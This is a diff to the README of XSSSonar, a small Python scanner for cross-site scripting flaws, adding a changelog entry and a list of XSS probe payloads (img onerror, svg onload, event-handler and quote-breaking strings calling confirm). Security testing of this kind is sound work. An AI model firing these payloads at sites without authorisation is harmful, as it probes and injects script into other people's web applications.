@@ -1,13 +1,20 @@
 # XSSSonar
+
 Little tool to look for XSS vulnerabilities in a web page.
 
 ![XSS Sonar Screenshot](xsssonar.png)
 
-# Info
+## Info
+
 This code is just a draft. There are some errors still to be corrected, and sometimes false positives occur.<br/>
 Test with Python 2.7.9 on Debian Jessie. I'll write it for Python 3.x maybe.<br/>
 
-# ChangeLog
+## ChangeLog
+
+<strong>0.1.5a</strong><br/>
+[-] Fixed some bugs<br/>
+[-] Less than 400 lines of code<br/>
+<br/>
 <strong>0.1.5</strong><br/>
 [-] Added scan on POST parameters<br/>
 [-] Changed name<br/>
@@ -19,6 +26,23 @@ Test with Python 2.7.9 on Debian Jessie. I'll write it for Python 3.x maybe.<br/
 <strong>0.1.4</strong><br/>
 [-] Check a single URL or a list.txt of sites
 
+## List of XSS Payloads
+
+    '">"'><img src=x onerror=confirm`XSS`>
+    "> <script>alert`XSS`</script>
+    '">"'><svg onload=confirm`XSS`>
+    "',;</script><script>confirm`XSS`</script>
+    '><svg onload=confirm`XSS`>
+    "><svg/onload=confirm`XSS`//
+    "><details/open/ontoggle=confirm`XSS`>
+    " onfocus="confirm`XSS`" autofocus=""
+    " onclick="confirm`XSS`"
+    " onmouseover="confirm`XSS`"
+    \"-confirm`XSS`//
+    \'-confirm`XSS`//
+    "-confirm`XSS`-"'-confirm`XSS`-'
+
 # To start
+
 pip install fake-useragent<br/>
 python xsssonar.py
